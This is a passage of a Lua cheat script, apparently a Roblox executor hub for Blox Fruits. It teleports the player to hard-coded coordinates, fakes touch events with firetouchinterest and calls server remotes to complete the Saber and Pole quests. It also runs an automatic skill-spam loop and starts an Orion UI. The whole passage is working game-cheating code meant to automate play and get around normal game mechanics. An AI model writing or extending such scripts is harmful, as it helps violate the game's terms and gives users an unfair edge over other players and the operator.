                                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                    CFrame.new(
                                        -1404.07996,
                                        29.8520069,
                                        5.26677656,
                                        0.888123989,
                                        -4.0340602e-09,
                                        0.459603906,
                                        7.5884703e-09,
                                        1,
                                        -5.8864642e-09,
                                        -0.459603906,
                                        8.71560069e-09,
                                        0.888123989
                                    ).Position,
                                    CFrame.new(
                                        -1404.07996,
                                        29.8520069,
                                        5.26677656,
                                        0.888123989,
                                        -4.0340602e-09,
                                        0.459603906,
                                        7.5884703e-09,
                                        1,
                                        -5.8864642e-09,
                                        -0.459603906,
                                        8.71560069e-09,
                                        0.888123989
                                    )
                                )
                            else
                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                            end
                        else
                            EquipWeaponName("Relic")
                            toTarget(
                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                CFrame.new(-1405.3677978516, 29.977333068848, 4.5685839653015).Position,
                                CFrame.new(-1405.3677978516, 29.977333068848, 4.5685839653015)
                            )
                        end
                    end
                else
                    
                    if
                        not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Torch") and
                            not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Torch")
                     then
                        toTarget(
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                            game:GetService("Workspace").Map.Jungle.Torch.Position,
                            game:GetService("Workspace").Map.Jungle.Torch.CFrame
                        )
                    else
                        EquipWeaponName("Torch")
                        if
                            (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -
                                CFrame.new(
                                    1115.23499,
                                    4.92147732,
                                    4349.36963,
                                    -0.670654476,
                                    -2.18307523e-08,
                                    0.74176991,
                                    -9.06980624e-09,
                                    1,
                                    2.1230365e-08,
                                    -0.74176991,
                                    7.51052998e-09,
                                    -0.670654476
                                ).Position).Magnitude < 5
                         then
                            toTarget(
                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                                CFrame.new(
                                    1114.59863,
                                    4.92147732,
                                    4350.64258,
                                    -0.508235395,
                                    1.00975717e-09,
                                    0.861218214,
                                    7.77848985e-09,
                                    1,
                                    3.41788708e-09,
                                    -0.861218214,
                                    8.43606784e-09,
                                    -0.508235395
                                ).Position,
                                CFrame.new(
                                    1114.59863,
                                    4.92147732,
                                    4350.64258,
                                    -0.508235395,
                                    1.00975717e-09,
                                    0.861218214,
                                    7.77848985e-09,
                                    1,
                                    3.41788708e-09,
                                    -0.861218214,
                                    8.43606784e-09,
                                    -0.508235395
                                )
                            )
                            firetouchinterest(
                                game.Players.LocalPlayer.Character.Torch.Handle,
                                game:GetService("Workspace").Map.Desert.Burn.Fire,
                                0
                            )
                            firetouchinterest(
                                game.Players.LocalPlayer.Character.Torch.Handle,
                                game:GetService("Workspace").Map.Desert.Burn.Fire,
                                1
                            )
                            return
                        end
                        toTarget(
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position,
                            CFrame.new(
                                1115.23499,
                                4.92147732,
                                4349.36963,
                                -0.670654476,
                                -2.18307523e-08,
                                0.74176991,
                                -9.06980624e-09,
                                1,
                                2.1230365e-08,
                                -0.74176991,
                                7.51052998e-09,
                                -0.670654476
                            ).Position,
                            CFrame.new(
                                1115.23499,
                                4.92147732,
                                4349.36963,
                                -0.670654476,
                                -2.18307523e-08,
                                0.74176991,
                                -9.06980624e-09,
                                1,
                                2.1230365e-08,
                                -0.74176991,
                                7.51052998e-09,
                                -0.670654476
                            )
                        )
                    end
                end
            end
        else
            if CheckMob({"Saber Expert [Lv. 200] [Boss]"},true)
             then
                donandngu2 = CheckMob({"Saber Expert [Lv. 200] [Boss]"},true)
                
                if game.workspace.Enemies:FindFirstChild(donandngu2.Name) then 
                    KillMob(donandngu2)
                else
                    spawn(Tweento(donandngu2.HumanoidRootPart.CFrame),1)
                end
            else
                
            end
        end
    end
end
spawn(
    function()
        while task.wait() do
            if Settings["Auto Spam Skill"] or autospamskill then
                print("Auto Skill")
                autoskill()
                wait(1.2)
            end
        end
    end
)
Sabered = CheckItem("Saber")
Sabered_gg = 0
PoleV1ed = CheckItem("Pole (1st Form)")
PoleV1ed_gg = 0
Sea2Ed = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") == 0
Sea2Ed_gg = 0
if AutoSaber_Toggle and Sabered then 
    AutoSaber_Toggle:Set(false)
end
if AutoPoleV1_Toggle and PoleV1ed then 
    AutoPoleV1_Toggle:Set(false)
end
LoadedUiHub = true 
OrionLib:Init()
